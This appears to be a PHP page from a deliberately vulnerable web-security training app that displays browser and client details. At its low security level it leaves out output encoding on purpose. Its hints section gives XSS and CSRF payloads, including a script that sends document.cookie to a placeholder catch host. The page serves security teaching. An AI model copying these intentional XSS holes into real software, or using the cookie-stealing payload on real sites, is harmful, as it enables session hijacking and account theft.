<?php 

	try{
		switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   			// DO NOTHING: This is insecure		
				$lEncodeOutput = FALSE;
				$luseSafeJavaScript = "false";
			break;
		    		
	   		case "5": // This code is fairly secure
	  			/* 
	  			 * NOTE: Input validation is excellent but not enough. The output must be
	  			 * encoded per context. For example, if output is placed	 in HTML,
	  			 * then HTML encode it. Blacklisting is a losing proposition. You 
	  			 * cannot blacklist everything. The business requirements will usually
	  			 * require allowing dangerous charaters. In the example here, we can 
	  			 * validate username but we have to allow special characters in passwords
	  			 * least we force weak passwords. We cannot validate the signature hardly 
	  			 * at all. The business requirements for text fields will demand most
	  			 * characters. Output encoding is the answer. Validate what you can, encode it
	  			 * all.
	  			 * 
	  			 * For JavaScript, always output using innerText (IE) or textContent (FF),
	  			 * Do NOT use innerHTML. Using innerHTML is weak anyway. When 
	  			 * attempting DHTML, program with the proper interface which is
	  			 * the DOM. Thats what it is there for.
	  			 */
	   			// encode the output following OWASP standards
	   			// this will be HTML encoding because we are outputting data into HTML
				$lEncodeOutput = TRUE;
				$luseSafeJavaScript = "true";
	   		break;
	   	}// end switch		
	
		require_once 'classes/ClientInformationHandler.php';
		$lClientInformationHandler = new ClientInformationHandler();
		
		if ($lEncodeOutput){
			$lWhoIsInformation = $Encoder->encodeForHTML($lClientInformationHandler->whoIsClient());
			$lOperatingSystem = $Encoder->encodeForHTML($lClientInformationHandler->getOperatingSystem());
			$lBrowser = $Encoder->encodeForHTML($lClientInformationHandler->getBrowser());
			$lClientHostname = $Encoder->encodeForHTML($lClientInformationHandler->getClientHostname());
			$lClientIP = $Encoder->encodeForHTML($lClientInformationHandler->getClientIP());
			$lClientUserAgentString = $Encoder->encodeForHTML($lClientInformationHandler->getClientUserAgentString());
			$lClientReferrer = $Encoder->encodeForHTML($lClientInformationHandler->getClientReferrer());
			$lClientPort = $Encoder->encodeForHTML($lClientInformationHandler->getClientPort());
		}else{
			$lWhoIsInformation = $lClientInformationHandler->whoIsClient();
			$lOperatingSystem = $lClientInformationHandler->getOperatingSystem();
			$lBrowser = $lClientInformationHandler->getBrowser();
			$lClientHostname = $lClientInformationHandler->getClientHostname();
			$lClientIP = $lClientInformationHandler->getClientIP();
			$lClientUserAgentString = $lClientInformationHandler->getClientUserAgentString();
			$lClientReferrer = $lClientInformationHandler->getClientReferrer();
			$lClientPort = $lClientInformationHandler->getClientPort();
		}// end if
	
    } catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
    }// end try;
?>

<div class="page-title">Browser Information</div>
<div>&nbsp;</div>
<table border="1px" width="75%" class="main-table-frame">
	<tr class="report-header"><td colspan="3">Info obtained by PHP</td></tr>
	<tr><td class="non-wrapping-label">Client IP</td><td><?php echo $lClientIP; ?></td></tr>
    <tr><td class="non-wrapping-label">Client Hostname</td><td><?php echo $lClientHostname; ?></td></tr>
    <tr><td class="non-wrapping-label">Operating System</td><td><?php echo $lOperatingSystem ?></td></tr>
    <tr><td class="non-wrapping-label">User Agent String</td><td><?php echo $lClientUserAgentString; ?></td></tr>
    <tr><td class="non-wrapping-label">Referrer</td><td><?php echo $lClientReferrer; ?></td></tr>
    <tr><td class="non-wrapping-label">Remote Client Port</td><td><?php echo $lClientPort; ?></td></tr>
    <tr><td class="non-wrapping-label">WhoIs info for client IP</td><td><pre><?php echo $lWhoIsInformation; ?></pre></td></tr>
	<?php 
	if ($lEncodeOutput){	
		foreach ($_COOKIE as $key => $value){
	    	echo '<tr><td class="non-wrapping-label">Cookie '.$Encoder->encodeForHTML($key).'</td><td>'.$Encoder->encodeForHTML($value).'</pre></td></tr>';
		}// end foreach
	}else{
		foreach ($_COOKIE as $key => $value){
	    	echo '<tr><td class="non-wrapping-label">Cookie '.$key.'</td><td>'.$value.'</pre></td></tr>';
		}// end foreach
	}// end if
	?>    
</table>
<div>&nbsp;</div><div>&nbsp;</div>
<table border="1px" width="75%" class="main-table-frame">
    <tr class="report-header"><td colspan="3">Info obtained by JavaScript</td></tr>
	<tr>
		<td class="non-wrapping-label">Browser Name</td>
		<td id="id_browser_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Browser Codename</td>
		<td id="id_browser_codename_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Browser Version</td>
		<td id="id_browser_version_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Cookie Enabled?</td>
		<td id="id_cookie_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Platform</td>
		<td id="id_platform_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">User Agent</td>
		<td id="id_user_agent_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">CPU Class</td>
		<td id="id_java_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">System Language</td>
		<td id="id_system_language_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Resolution</td>
		<td id="id_resolution_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Color Depth</td>
		<td id="id_color_depth_enabled_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Referrer</td>
		<td id="id_referrer_td"></td>
	</tr>
	<tr>
		<td class="non-wrapping-label">Plug-Ins</td>
		<td id="id_plug_ins_td"></td>
	</tr>
</table>

<script type="text/javascript">

	var g_beSmart = <?php echo $luseSafeJavaScript; ?>;
	var g_usingIE = ('all' in document);

	var outputValue = function(p_elementId, p_elementValue, p_beSmart, p_usingIE){
		if(p_beSmart){
			//safe
			if(p_usingIE){
				document.getElementById(p_elementId).innerText = p_elementValue;
			}else{
				document.getElementById(p_elementId).textContent = p_elementValue;
			}// end if
		}else{
			// unsafe and low-skill - should be using DOM interface
			document.getElementById(p_elementId).innerHTML = p_elementValue;
		}//end if
	}// end function

	outputValue("id_browser_td", navigator.appName, g_beSmart, g_usingIE);
	outputValue("id_browser_codename_td", navigator.appCodeName, g_beSmart, g_usingIE);
	outputValue("id_browser_version_td", navigator.appVersion, g_beSmart, g_usingIE);
	outputValue("id_cookie_enabled_td", navigator.cookieEnabled, g_beSmart, g_usingIE);
	outputValue("id_platform_td", navigator.platform, g_beSmart, g_usingIE);
	outputValue("id_user_agent_td", navigator.userAgent, g_beSmart, g_usingIE);
	outputValue("id_cpu_class_td", navigator.cpuClass, g_beSmart, g_usingIE);
	outputValue("id_java_enabled_td", navigator.javaEnabled, g_beSmart, g_usingIE);
	outputValue("id_system_language_enabled_td", navigator.systemLanguage, g_beSmart, g_usingIE);
	outputValue("id_resolution_enabled_td", screen.width+"x"+screen.height, g_beSmart, g_usingIE);
	outputValue("id_color_depth_enabled_td", screen.colorDepth, g_beSmart, g_usingIE);
	outputValue("id_referrer_td", document.referrer, g_beSmart, g_usingIE);

	if (navigator.appName=="Netscape"){
		for (i in navigator.plugins){
			l_plugins =+ navigator.plugins[i].name.toString() + ';';
		}// end for
		outputValue("id_plug_ins_td", l_plugins, g_beSmart, g_usingIE);
	}// end if
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off 
						  		both reflected (you see the results 
								instantly) and stored (someone can run across it 
								later in another app that uses the same database). 
								"&lt;script&gt;alert("XSS");&lt;/script&gt;" is the 
								classic, but there are far more interesting things you 
								could do which I plan show in a video later.
							</li>
						  	<li>For some hot cookie stealing action, try something like:
								<pre>
								&lt;script&gt;
									new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
								&lt;/script&gt;
								</pre>	
							</li>
							<li>Check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may 
								allow you to get around some filters.
							</li>
							<li><b>For CSRF:</b>You can create another page someplace and
							make a link to an image that is not an image. You can also
							send someone an HTML email with a link inside. Sending links over
							HTML aware Instant Messaging like Communicator also works. One of the 
							quietest methods is to use HTML injection to poison a web page thus 
							creating a persistant attack. When a user visits the poisoned page, 
							their browser will reach out to the targe page. Using an AJAX request 
							can keep the rouge tranaction silent.
							You could use something like the following:
							<br>
							&lt;img src="http://localhost/mutillidae/index.php?page=add-to-your-blog.php&input_from_form=hi%20there%20monkeyboy"&gt;
							<br>
							This is the easy way to do CSRF with the GET method. Login 
							as someone, make your page with the link image someplace else, 
							and then view it. You should now see
							something new on the comment wall.
							</li>
							<li>
								For Cross Site Request Forgery, a tool like the Social
								Engineering Toolkit by Dave Kennedy can help. 
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>